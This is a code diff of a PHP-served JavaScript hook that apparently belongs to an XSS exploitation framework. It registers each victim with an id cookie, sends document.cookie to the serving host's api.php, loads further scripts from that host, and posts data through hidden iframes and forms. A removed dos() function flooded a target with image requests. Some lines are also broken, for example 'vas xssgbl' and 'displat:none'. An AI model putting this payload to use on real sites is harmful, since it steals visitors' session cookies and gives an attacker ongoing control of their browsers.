@@ -1,12 +1,21 @@
 <?php
 header('Content-type: text/javascript');
-$id = (isset($_GET['id'])) ? $_GET['id'] : preg_replace("/[\+\/\=]/", "", base64_encode(openssl_random_pseudo_bytes(12)));
+if (isset($_COOKIE['xssid']))
+	$id = $_COOKIE['xssid'];
+else {
+	if (isset($_GET['id']))
+		$id = $_GET['id'];
+	else
+		$id = preg_replace("/[\+\/\=]/", "", base64_encode(openssl_random_pseudo_bytes(12)));
+	setcookie("xssid", $id, 0, "/");
+}
 echo "var sploit = '{$_SERVER['HTTP_HOST']}';";
 echo "var sploitapi = 'http://{$_SERVER['HTTP_HOST']}/api.php';";
 echo "var sploitid = '$id';";
 ?>
 
-var xsshid = "display:none;width:0;height:0;";
+vas xssgbl = Array();
+var xsshide = "display:none;width:0;height:0;";
 var gdebug = "";
 function debug(message) { gdebug += message + ", "; }
 function getCookie(name) {
@@ -18,6 +27,8 @@ function getCookie(name) {
     }
     return "";
 }
+
+function xssopt(name) { return(xssgbl[xssmodpre+name]); }
 
 function setCookie(cname, cvalue, exdays) {
 	var d = new Date();
@@ -35,10 +46,17 @@ function capture() {
 }
 
 
+function createSploit() {
+	//document.write("<div id='sploit' style='display:none'>text</div>");
+	var d = xssce("div");
+	xsssa(d, "id", "sploit");
+	xsssa(d, "style", "displat:none");
+	document.body.appendChild(d);
+}
 
-function dos(p, num) { for(i=0;i<num;i++){document.write("<img src='"+p+"' />"); } }
+
 function reg() {
-	document.write("<div id='sploit' style='display:none'>text</div>");
+	createSploit();
 	cs("http://"+sploit+"/api.php?reg="+sploitid+"&c="+encodeURIComponent(document.cookie));
 }
 function hb() { 
@@ -51,7 +69,7 @@ function cs(s) {
 	script.type="text/javascript";
 	script.src=s;
 	var d = xssgbi("sploit");
-	if (!d) { document.write("<div id='sploit' style='display:none'>text</div>");}
+	if (!d) { createSploit(); }
 	d = xssgbi("sploit");
 //console.log(d);
 	d.appendChild(script);
@@ -66,12 +84,19 @@ function cs(s) {
  * load: onload function (or false)
  */
 function ci(url, st, id, err, load) { 
-	var i = document.createElement('img');
-	i.src=url;
-	i.style=st;
-	if (load) { xsssa(i, "onload", load); }
-	if (err) { xsssa(i, "onerror", err); }
-	xssgbi(id).append.Child(i);
+	var xssi = xssce('img');
+	xssi.style=st;
+	if (load) { xsssa(xssi, "onload", load); console.log("add load event");}
+	if (err) { xsssa(xssi, "onerror", err); console.log("add error event"); }
+	xssi.onload = function() { 
+		console.log("image loaded!");
+		console.log(xssi);
+		//var e = xssgbi(id);
+		//if (!e) { debug("could not find element id: " + id); console.log("ci failed no such id: " + id); }
+		//e.appendChild(i);
+		document.body.appendChild(xssi);
+	}
+	xssi.src=url;
 }
 
 /**
@@ -81,15 +106,16 @@ function ci(url, st, id, err, load) {
  * data: (dictionary) key value array of data to post
  * a: the api action (usually 'log')
  */
-function xsscop(url, data, a) {
+function xsscop(url, data) {
 	// create elements
 	var ifr = xssce('iframe');
 	var frm = xssce('form');
 	// set attributes
 	xsssa(ifr, "name", "cspost");
-	xsssa(ifr, "style", xsshid);
+	xsssa(ifr, "style", xsshide);
 	xsssa(ifr, "id", "xsscop");
-	xsssa(frm, "action", sploitapi+"?A="+a);
+
+	xsssa(frm, "action", url);
 	xsssa(frm, "method", "post");
 	xsssa(frm, "target", "cspost");
 
@@ -102,13 +128,19 @@ function xsscop(url, data, a) {
 		frm.appendChild(e);
 	}
 
+
 	// append form to iframe
 	ifr.appendChild(frm);
+
+	console.log(ifr);
+	console.log(frm);
+
 	document.body.appendChild(ifr);
 	// submit the form
 	frm.submit();
+console.log("submitted!");
 	// remove the frame
-	xssrm("xsscop");
+	//xssrm("xsscop");
 }
 
 
